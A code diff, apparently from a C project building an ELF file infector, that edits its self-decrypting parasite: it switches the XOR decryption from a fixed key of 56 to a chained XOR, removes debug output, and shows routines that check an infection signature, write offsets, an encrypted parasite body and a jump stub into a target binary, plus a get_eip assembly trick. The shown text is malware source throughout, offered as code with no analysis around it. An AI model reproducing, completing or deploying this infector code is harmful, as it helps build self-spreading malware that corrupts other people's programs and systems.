@@ -386,27 +386,31 @@ void decrypter(unsigned long address_of_main)
 	size_t	offset;
 	char	*start;
 
-	// __asm__("int3");
 	offset = *(size_t *)(address_of_main - (sizeof(offset) * 2));
 	size = *(size_t *)(address_of_main - sizeof(offset));
-	ft_putchar('\n');
-	ft_putnbr(offset);
-	ft_putchar('\n');
-	ft_putnbr(size);
-	ft_putchar('\n');
 	start = address_of_main + offset;
 	offset = 0;
 	if(size && im_infected(address_of_main))
 	{
-		start[offset] ^= 56;//*(int *)(address_of_main - 4);
+		start[offset] ^= *(int *)(address_of_main -  (sizeof(offset) * 2));
 		offset++;
-		while (offset < size)
+		while (offset < size+1)
 		{
-			start[offset] ^= 56;//start[offset - 1];
+			start[offset] ^= start[offset - 1];
 			offset++;
 		}
 	}
+
 }
+
+unsigned long get_eip(void)
+{
+	__asm__("call yeah\n"
+	        ".globl yeah\n"
+	        "yeah:\n"
+	        "popq %rax");
+}
+
 bool	im_infected(char *data)
 {
 	char sig[54];
@@ -1039,33 +1043,15 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	size_t	value;
 	ft_putchar('6');
 	ft_putchar('\n');
-	
 	size_wrote =	put_sig(fd);
-	
-	ft_putchar('\n');
-	
 	value = (address_of_start_encrypt - address_of_start);
 	size_wrote += write(fd, (char *)(&value), sizeof(size_t));
-	
-	ft_putnbr(value);
-	ft_putchar('\n');
-	
 	value = parasite_size - 7 - (address_of_start_encrypt - address_of_start);
 	size_wrote += write(fd, (char *)(&value), sizeof(size_t));
-	
-	ft_putnbr(value);
-	ft_putchar('\n');
-
-	ft_putchar('7');
-	ft_putchar('\n');
-	ft_putnbr(size_wrote);
-	ft_putchar('\n');
-
-	 //size_wrote += write(fd,"\xcc",1);
 	ft_putchar('8');
 	ft_putchar('\n');
 	size_wrote += write(fd,(char *) address_of_start, (address_of_start_encrypt - address_of_start));
-	size_wrote += crypter((char *)address_of_start_encrypt, parasite_size - 7 - (address_of_start_encrypt - address_of_start) , 56, fd);
+	size_wrote += crypter((char *)address_of_start_encrypt, parasite_size - 7 - (address_of_start_encrypt - address_of_start) , (address_of_start_encrypt - address_of_start), fd);
 	ft_putchar('9');
 	ft_putchar('\n');
 	size_wrote += write(fd,jmp_code,9);
@@ -1451,38 +1437,23 @@ size_t i ;
 	{
 		i = 0;
 		lseek(fd, (off_t)size, SEEK_CUR);
-		// ft_putnbr(lseek(fd, (off_t)size, SEEK_CUR));
-		// ft_putstr("\n");
-		// ft_putnbr(size);
-		// ft_putstr("\n");
-		tab[(size - 1) % 2] = read[size + 1];
+		tab[(size - 1) % 2] = read[size - 1];
 		while ((int)size > 0)
 		{
-		// 	ft_putnbr(size);
-		// ft_putstr("\\");
-			tab[size % 2] = (read[size] ^ 56);// tab[(size - 1) % 2]);
+			tab[size % 2] = read[size] ^ read[size - 1];
 			i += write(fd, &(tab[size % 2]), 1);
 			lseek(fd, (off_t)-2, SEEK_CUR);
 			size--;
 		}
 		tab[size % 2] = (read[size] ^ key);
 		i += write(fd, &(tab[size % 2]), 1);
-		// ft_putstr("bite\n");
+		write(1, &(tab[size % 2]), 1);
 		lseek(fd, (off_t)0, SEEK_END);
-		// ft_putnbr(lseek(fd, (off_t)0, SEEK_END));
-		// ft_putstr("\n");
 		size--;
 		return (i);
 	}
 }
 
-unsigned long get_eip(void)
-{
-	__asm__("call yeah\n"
-	        ".globl yeah\n"
-	        "yeah:\n"
-	        "popq %rax");
-}
 void end_code() {
 __asm__(".globl myend\n"
         "myend:	     \n"
